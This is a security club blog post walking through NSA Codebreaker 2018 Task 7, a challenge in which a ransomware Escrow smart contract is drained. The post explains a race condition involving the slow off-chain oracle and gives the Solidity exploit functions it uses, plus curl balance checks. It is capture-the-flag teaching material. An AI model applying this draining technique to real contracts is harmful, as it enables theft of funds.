<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65 crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js integrity=sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4 crossorigin=anonymous></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;600;800&family=Open+Sans:wght@400;600&display=swap" rel=stylesheet><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css integrity="sha512-q3eWabyZPc1XTCmF+8/LuE1ozpg5xxn7iO89yfSOd5/oKvyqLngoNGsx8jq92Y8eXJ/IRxQbEC+FGSYxtk2oiw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/solid.min.css integrity="sha512-LopA1sokwAW/FNZdP+/5q8MGyb9CojL1LTz8JMyu/8YZ8XaCDn1EOm6L7RWIIOHRM7K4jwnHuOmyLZeeeYxSOA==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=/caseyhates.css><title>NSA Codebreaker 2018 Task 7 | OSU Security Club</title></head><body id=background-img style=background-image:url(/blog/nsa-codebreaker-2018-task-7.jpg);background-position:50%><nav class="navbar navbar-expand-lg px-lg-5 py-lg-2 fixed-top topbar bg-light"><div class="container-fluid flex-nowrap px-lg-5"><a class=navbar-brand href=/><img src=/osusec-banner.png class=img-fluid alt=OSUSEC width=450px></a>
<button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"></ul><ul class="navbar-nav d-flex mb-2 mb-lg-0"><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/>Home</a></li><li class="nav-item px-1 dropdown"><a class="nav-link text-black dropdown-toggle" href=# role=button data-bs-toggle=dropdown aria-expanded=false>About</a><ul class=dropdown-menu><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/about/>Who We Are</a></li><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/club-constitution/>Club Constitution</a></li><li><a class="dropdown-item topbar topbar-drop shadow-none" href=/wicys/>WiCyS</a></li></ul></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/calendar/>Calendar</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/blog/>Blog</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/ctf-league/>CTF League</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/accomplishments/>Accomplishments</a></li><li class="nav-item px-1"><a class="nav-link highlight-orange-nav" href=/resources/>Resources</a></li></ul></div></div></nav><main id=main><div id=home-jumbotron class="jumbotron text-center hero-content infopage-hero d-flex flex-column justify-content-center"><h1 class="hero-title py-1">NSA Codebreaker 2018 Task 7</h1></div><div class="bg-light justify-content-center infopage-content" style=min-height:60vh><div class=blog-content><h1 class=blog-title>NSA Codebreaker 2018 Task 7</h1><div class="blog-subtext d-flex flex-wrap"><p class=blog-subtext-item><i class="fa fa-user"></i> Andrew Quach</p><p class=blog-subtext-item><i class="fa fa-folder"></i> Tags</p><p class=blog-subtext-item><i class="fa fa-calendar"></i> <time datetime=2019-01-16>Jan 16, 2019</time></p></div><img src=/blog/nsa-codebreaker-2018-task-7.jpg alt class=blogcard-img><div class=blog-content-text><p><strong>Refunds – (Smart-Contract Development; Vulnerability Analysis; Exploit Development)</strong></p><p>Task 7 has us refund the victims who have already paid the ransom. In other words, we need to recover all the funds in the Escrow contract, then transfer the funds to the victims. Recall that from <a href=https://www.osusec.org/nsa-codebreaker-2018-task-6/>task 6</a>, we found that we could deploy and authenticate arbitrary ransom contracts.</p><h4 id=scanning-for-vulnerabilities>Scanning for Vulnerabilities</h4><p>A natural place we can start looking for a vulnerability is the <strong>requestRefund()</strong> function.</p><pre tabindex=0><code>function requestRefund(uint id, uint amount) external restrictSenderToVictim(id) returns (bool) {
    address payer = vicToPayerMap[id];
    if (payer &gt; 0 &amp;&amp; escrowMap[id] &gt;= amount &amp;&amp; amount &gt; 0) {
        escrowMap[id] -= amount;
        payer.transfer(amount);
        return true;
    }
    return false;
}
</code></pre><p>The victims can retrieve unused funds paid into the Escrow contract using <strong>requestRefund()</strong>. However, this function seems difficult to exploit as <strong>escrowMap[id]</strong> only gets increased when ether is paid into the contract. Getting an arbitrary amount past the <strong>escrowMap[id] >= amount</strong> guard would prove to be rough. So, perhaps there is another <strong>transfer()</strong> call that is easier to exploit.</p><pre tabindex=0><code>function decryptCallback(uint id, bytes32 decKey, bool authResult) external restrictSenderToOracle {
    require(bytes(encFileMap[id]).length != 0, &#34;missing encrypted file&#34;);
    delete encFileMap[id]; // no longer needed

    decKeyMap[id] = decKey;
    emit DecryptCallbackEvent(id, authResult);

    Victim storage vicInfo = victimMap[id];
    escrowMap[id] -= vicInfo.ransomAmount;

    if (authResult) {
        ownerBalance += vicInfo.ransomAmount;
        Ransom(vicInfo.ransomAddr).fulfillContract();
    } else {
        vicToPayerMap[id].transfer(vicInfo.ransomAmount); 
    } 
</code></pre><p>A few lines down, we see that the <strong>decryptCallback()</strong> function also transfers funds to the victim. This time, there is no guard. It just refunds the Ransom contract’s ransom amount to the victim upon decryption failure. Fortunately for us, we can control anything in the Ransom contract. If we make a fake Ransom contract with the ransom amount equal to all the funds in the Escrow contract (300 ether + 10 wei), we completely drain the Escrow contract.</p><p><img src=/blog/nsa-codebreaker-2018-task-7-escrow-contract.png alt="Diagram of the Escrow Contract"></p><p>Recall from task 6, we learned how the decryption process functions. We need the oracle to call <strong>decryptCallback()</strong> with our fake Ransom contract in place. But to do so, we need to execute <strong>payRansom()</strong>. And to execute <strong>payRansom()</strong> without paying, we need the ransom amount to be zero. How can we have the ransom amount be both 0 ether and 300 ether?</p><h4 id=race-condition>Race Condition</h4><p>Ideally, the ransom amount would be 0 ether at <strong>payRansom()</strong> and 300 ether at <strong>decryptCallback()</strong>. To set up this situation, we can abuse the fact that the oracle is off-chain and slow. We can</p><ol><li>Set up a ransom contract with no ransom.</li><li>Call <strong>payRansom()</strong>.</li><li>Call <strong>decryptKey()</strong>.</li><li>Reinitialize the ransom contract to have a 300 ether ransom.</li><li>Let the oracle run <strong>decryptCallback()</strong>.</li><li>Profit!</li></ol><h4 id=clarifying-questions>Clarifying Questions</h4><p>There are a few questions about this exploit that arise.</p><p><strong>Q:</strong> First, why do we need to call <strong>payRansom()</strong> if we can just call <strong>decryptKey()</strong> directly?
<strong>A:</strong> The <strong>DecryptEvent</strong> requires <strong>encFileMap[id]</strong> which is only set in <strong>payRansom()</strong>. This may not be necessary since we want the <strong>DecryptEvent</strong> to fail anyway, but I didn’t risk it. Either way, it doesn’t add much more work.</p><p><strong>Q:</strong> Second, why do we need to race the <strong>DecryptEvent</strong>? Can’t we swap steps 3 and 4?
<strong>A:</strong> The <strong>decryptKey()</strong> call has the <strong>hasPaidRansom(id)</strong> modifier, defined by (<strong>escrowMap[id] >= victimMap[id].ransomAmount</strong>). Since we did not pay anything, we need the ransom amount to still be zero at this point.</p><h4 id=draining-the-escrow-contract>Draining the Escrow Contract</h4><p>We can set up a withdraw function following the described steps.</p><pre tabindex=0><code>function withdrawl() external {
    // Set encrypted file
    Escrow(escrowAddr).payRansom(victimId, &#34;dummy value&#34;);
    // Call decrypt event
    Escrow(escrowAddr).decryptKey(victimId, &#34;dummy key&#34;);
    // Race decrypt event
    modifyRansom(300000000000000000010 wei);
}
</code></pre><p>The call to <strong>modifyRansom()</strong> simply re-registers the ransom with the same victim ID and address but a different ransom amount. We register the ransom with <strong>victimAddr = address(this)</strong> to bypass the <strong>restrictSenderToVictim(id)</strong> modifier in <strong>payRansom()</strong>.</p><pre tabindex=0><code>function modifyRansom(uint newRansomAmount) internal {
    Escrow(escrowAddr).registerRansom(newRansomAmount, victimId, victimAddr);
}
</code></pre><p>We have <strong>requestKey()</strong> do nothing, keeping it there only so <strong>payRansom()</strong> does not error.</p><pre tabindex=0><code>function requestKey() external view onlyAuthenticated {
}
</code></pre><p>Lastly, we set up a payable fallback function to receive the payments.</p><pre tabindex=0><code>function () payable public {
}
</code></pre><p>And with that, upon authenticating our RefundRansom contract and calling our newly created <strong>withdrawl()</strong> function, we recover all the funds in the Escrow contract.</p><h4 id=refunding-the-victims>Refunding the Victims</h4><p>To refund we the victims, we just need to add a way to transfer the funds from our RefundRansom contract.</p><pre tabindex=0><code>function sendPayment(address addr, uint amount) external {
    addr.transfer(amount);
}
</code></pre><p>Although this could do with better permission modifiers, the function does its job.</p><p>After manually refunding the three victims who paid the ransom, we can check to see if everything worked as expected.</p><pre tabindex=0><code>curl -X POST --data &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;,&#34;method&#34;:&#34;eth_getBalance&#34;,&#34;params&#34;:[&#34;0xe160365793baef0d971765be8180275f9fea2b3d&#34;, &#34;latest&#34;],&#34;id&#34;:1}&#39; -H &#34;Content-Type: application/json&#34; $URL

Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000

curl -X POST --data &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;,&#34;method&#34;:&#34;eth_getBalance&#34;,&#34;params&#34;:[&#34;0x139f8f562dadc241e42744c99ef803381f3e1d08&#34;, &#34;latest&#34;],&#34;id&#34;:1}&#39; -H &#34;Content-Type: application/json&#34; $URL
Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000

curl -X POST --data &#39;{&#34;jsonrpc&#34;:&#34;2.0&#34;,&#34;method&#34;:&#34;eth_getBalance&#34;,&#34;params&#34;:[&#34;0x6c8e1acf3e73f2a0a03dbfc8f1a14269677b7ac5&#34;, &#34;latest&#34;],&#34;id&#34;:1}&#39; -H &#34;Content-Type: application/json&#34; $URL
Beforehand: 0x15acbdd634f769000 = 24989310376000000000
Afterwards: 0x6c6933b90b2869000 = 124989310376000000000
</code></pre><p>All the victims have indeed received the ether that is rightfully theirs!</p><p><a href=https://gist.github.com/Aqcurate/d6c6fd6087ef73aaa10449641d48b795>Here is the full RefundRansom contract.</a></p><h4 id=submission-details>Submission Details</h4><p><strong>Escrow Address:</strong> 0x147c5B6fBdE084D96c4b3BfAb72f208E78bae6b8</p><p><img src=/blog/nsa-codebreaker-2018-task-7-finished.png alt="Screenshot of Task 7 on NSA Codebreaker Challenge website complete"></p></div></div></div></main><footer class="border-top py-4 bg-light"><div class="text-muted text-center"><p>© <script>document.write((new Date).getFullYear())</script>OSU Security Club.</p><p>Contact us at:
<a href=mailto:security.clubs@oregonstate.edu class="text-reset text-decoration-none fw-bold">security.clubs@oregonstate.edu</a></p><div class=mt-3><div class="d-flex justify-content-center gap-3"><a href=https://www.instagram.com/dam.secure/ target=_blank class=text-reset title=Instagram><i class="fab fa-instagram" aria-hidden=true></i></a>
<a href=https://x.com/OSUSEC target=_blank class=text-reset title=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></div></div></div></footer></body></html>